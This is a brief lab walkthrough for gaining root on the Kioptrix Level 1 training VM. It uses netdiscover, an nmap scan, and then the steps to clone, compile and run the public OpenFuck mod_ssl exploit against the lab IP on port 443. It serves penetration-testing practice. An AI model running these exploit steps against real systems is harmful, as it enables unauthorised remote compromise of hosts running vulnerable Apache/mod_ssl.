###  Gain root access on this machine:  ###

• Start the Kioptrix VM on VirtualBox or VMware
 ![Kioptrix_Level_1-1](https://user-images.githubusercontent.com/58820314/112413283-9997c200-8d28-11eb-877e-4c53a79bb04e.png)
 
 • Discover the Network to obtain the IP of this machine with : **sudo netdiscover -i eth0** 
 ![1](https://user-images.githubusercontent.com/58820314/112413965-de702880-8d29-11eb-9273-4d0e75b96739.png)

• Ping on this machine using this command: **ping 192.168.3.129** 
     ,,, you will see that no lost packets, the connection is perfect.  
 ![4](https://user-images.githubusercontent.com/58820314/112413553-13c84680-8d29-11eb-9654-0220635a4a13.png)
 
• Next step is to scan for vulnerabilities using **Nmap** by this command: ** nmap -A -T4 192.168.3.129  **
![2](https://user-images.githubusercontent.com/58820314/112413797-79b4ce00-8d29-11eb-8651-8a694eb225e4.png)

 ### we will use this vulnerability with the following steps  ###
#### 1-** Download OpenFuck.c ** ####
git clone https://github.com/heltonWernik/OpenFuck.git
#### 2- ** Install ssl-dev library ** ####
apt-get install libssl-dev
#### 3- ** It's Compile Time ** ####
gcc -o OpenFuck OpenFuck.c -lcrypto
#### 4- ** Running the Exploit ** ####
./OpenFuck
#### 5- See which service you witch to exploit. For example if you need to Red Hat Linux, using apache version 1.3.20. Trying out using the 0x6b option ./OpenFuck 0x6b [Target Ip] [port] -c 40 ####
#### for example: ** ./exploit 0x6b 192.168.3.129 443 -c 40 ** ####
#### The result is shown on the next Image ####
  ![5](https://user-images.githubusercontent.com/58820314/112415035-cb5e5800-8d2b-11eb-9274-bc006230b25c.png)
